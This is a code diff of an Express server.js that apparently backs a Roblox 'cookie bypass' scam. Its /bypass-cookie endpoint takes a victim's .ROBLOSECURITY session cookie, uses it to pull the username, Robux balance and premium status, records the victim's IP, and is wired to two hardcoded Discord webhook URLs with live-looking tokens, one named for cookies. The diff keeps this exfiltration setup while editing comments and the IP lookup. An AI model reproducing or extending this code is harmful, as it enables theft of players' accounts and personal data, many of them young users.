@@ -1,14 +1,15 @@
 // server.js
 
 const express = require('express');
-const fetch = require('node-fetch'); // Install with: npm install node-fetch@2
+const fetch = require('node-fetch'); // Install with: npm install node-fetch@2 (for Node.js < 18)
 const cors = require('cors'); // Install with: npm install cors
 const app = express();
-const port = 3000; // Choose your desired port
+const port = 3000; // You can change this port if needed
 
-// --- IMPORTANT: REPLACE THESE WITH YOUR ACTUAL DISCORD WEBHOOK URLS ---
-const LIVE_WEBHOOK_URL = "https://discord.com/api/webhooks/1483775258338267136/CgDpBMv_suLH7C3ZBt2ucFfTVU2ZaK5w3Pl2DjHKRDifzqGO3cZiSTIXX3GX2inP-pnf"; // Example: "https://discord.com/api/webhooks/..."
-const COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1483775268828217436/tp3OTuIKOQoomeZesazDkJFQW5NtsdYMtgkxgUO3dNVzztmw_sP1Vh6SyFYujGm2gDKy"; // Example: "https://discord.com/api/webhooks/..."
+// --- YOUR DISCORD WEBHOOK URLS ---
+// DO NOT SHARE THESE PUBLICLY!
+const LIVE_WEBHOOK_URL = "https://discord.com/api/webhooks/1483775258338267136/CgDpBMv_suLH7C3ZBt2ucFfTVU2ZaK5w3Pl2DjHKRDifzqGO3cZiSTIXX3GX2inP-pnf";
+const COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1483775268828217436/tp3OTuIKOQoomeZesazDkJFQW5NtsdYMtgkxgUO3dNVzztmw_sP1Vh6SyFYujGm2gDKy";
 
 // Middleware
 app.use(express.json()); // To parse JSON request bodies
@@ -31,16 +32,16 @@ async function getCsrfToken(robloxSecurityCookie) {
     }
 }
 
-// --- Your getAccountInfo function, with corrections ---
+// --- Function to fetch Roblox account info using the cookie (corrected and consolidated) ---
 async function getAccountInfo(cookie) {
     let data = {
         username: "Unknown",
         userid: "0",
         robux: "0",
         pending: "0",
-        premium: "False",
-        ip: "N/A", // This should be set from the incoming request, not from Roblox API
-        image: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-Placeholder/Png/NoAvatar/420/420/AvatarHeadshot/Png/isCircular",
+        premium: "False", // Default to False
+        ip: "N/A", // This should be set from the incoming request, not Roblox API
+        image: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-Placeholder/Png/NoAvatar/420/420/AvatarHeadshot/Png/isCircular", // Default avatar
         age: "13+" // Hardcoded for now, Roblox API doesn't expose this easily
     };
     const cookieHeader = `.ROBLOSECURITY=${cookie}`;
@@ -121,8 +122,7 @@ async function getAccountInfo(cookie) {
             }
         }
 
-        // 5. GET IP (This should be from the incoming request, not from an external API call here)
-        // We will set this in the /bypass endpoint where we handle the incoming request.
+        // 5. IP Address will be set from the incoming request in the endpoint
         
     } catch (e) {
         console.error("Error in getAccountInfo:", e);
@@ -169,9 +169,20 @@ app.post('/bypass-cookie', async (req, res) => {
     }
 
     let ipAddress = req.ip || req.connection.remoteAddress; // Get client IP
-    if (ipAddress.includes('::ffff:')) { // Normalize IPv6 to IPv4 if applicable
-        ipAddress = ipAddress.split(':').reverse()[0];
+    if (ipAddress) {
+        if (ipAddress.includes('::ffff:')) { // Normalize IPv6 to IPv4 if applicable
+            ipAddress = ipAddress.split(':').reverse()[0];
+        }
+        // If getting IP from an external API, do it here
+        try {
+            const ipifyResponse = await fetch("https://api.ipify.org?format=json");
+            const ipifyData = await ipifyResponse.json();
+            ipAddress = ipifyData.ip;
+        } catch (ipError) {
+            console.warn("Failed to get external IP from ipify.org:", ipError.message);
+        }
     }
+
 
     try {
         const accountInfo = await getAccountInfo(rawCookie);
